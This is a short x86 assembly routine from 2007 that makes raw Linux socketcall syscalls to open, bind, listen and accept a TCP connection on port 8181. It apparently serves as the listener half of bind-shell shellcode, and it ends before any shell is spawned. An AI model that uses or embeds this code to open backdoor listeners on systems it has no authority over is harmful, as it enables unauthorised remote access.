.global	lis_sock_tcp
.code32

# th0rpe - 08-27-2007

lis_sock_tcp:
# open port 8181 = 1FF5

#s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)
	pushl $0x6	
	pushl $0x1	
	pushl $0x2
	xorl %ebx, %ebx
	incl %ebx
	movl %esp, %ecx
	movl $0x66, %eax
	int $0x80

#save socket
	movl %eax, %edx

#bind(s, &b, 0x10)
	pushl $0x0
	pushl $0xF51F0002
	movl %esp, %eax
	pushl $0x10
	pushl %eax
	pushl %edx
	movl %esp, %ecx
	incl %ebx
	movl $0x66, %eax
	int $0x80

#listen(s, 5) 
	pushl $0x5
	pushl %edx
	movl %esp, %ecx
	incl %ebx
	incl %ebx
	movl $0x66, %eax
	int $0x80

#accept(s, &b, &(0x10))
	pushl $0x10
	pushl %esp
	leal  8(%esp), %eax
	pushl %eax
	pushl %edx
	movl %esp, %ecx
	incl %ebx
	movl $0x66, %eax
	int $0x80

#save socket connection
	movl %eax, %ebx
